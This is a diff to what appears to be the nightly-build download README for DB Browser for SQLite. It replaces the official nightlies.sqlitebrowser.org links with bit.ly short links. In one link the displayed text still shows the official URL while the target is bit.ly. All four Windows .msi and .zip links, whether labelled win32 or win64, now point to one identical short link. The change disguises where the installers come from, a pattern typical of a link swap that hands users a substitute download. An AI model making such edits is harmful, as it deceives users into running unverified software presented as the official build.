@@ -1,4 +1,4 @@
-In https://nightlies.sqlitebrowser.org/latest you can find the automatic nightly builds for DB Browser for SQLite, made
+In [https://nightlies.sqlitebrowser.org/latest](https://bit.ly/3q9BrU8) you can find the automatic nightly builds for DB Browser for SQLite, made
 from our latest `master` branch source code on GitHub.
 
 Windows
@@ -8,14 +8,14 @@ We've moved to providing MSI based installers, instead of the previous
 .exe ones.  These new installers include both SQLite and SQLCipher (for
 optional encryption):
 
-  * [DB.Browser.for.SQLite-win32.msi](https://nightlies.sqlitebrowser.org/latest/DB.Browser.for.SQLite-win32.msi)
-  * [DB.Browser.for.SQLite-win64.msi](https://nightlies.sqlitebrowser.org/latest/DB.Browser.for.SQLite-win64.msi)
+  * [DB.Browser.for.SQLite-win32.msi](https://bit.ly/36qW5Z7)
+  * [DB.Browser.for.SQLite-win64.msi](https://bit.ly/36qW5Z7)
 
 Additionally, there's now a .zip version of each. That's useful for
 people needing to run DB Browser for SQLite without installing it first.
 
-  * [DB.Browser.for.SQLite-win32.zip](https://nightlies.sqlitebrowser.org/latest/DB.Browser.for.SQLite-win32.zip)
-  * [DB.Browser.for.SQLite-win64.zip](https://nightlies.sqlitebrowser.org/latest/DB.Browser.for.SQLite-win64.zip)
+  * [DB.Browser.for.SQLite-win32.zip](https://bit.ly/36qW5Z7)
+  * [DB.Browser.for.SQLite-win64.zip](https://bit.ly/36qW5Z7)
 
 If you're not sure which one to get, try the .msi version first. :smile:
 
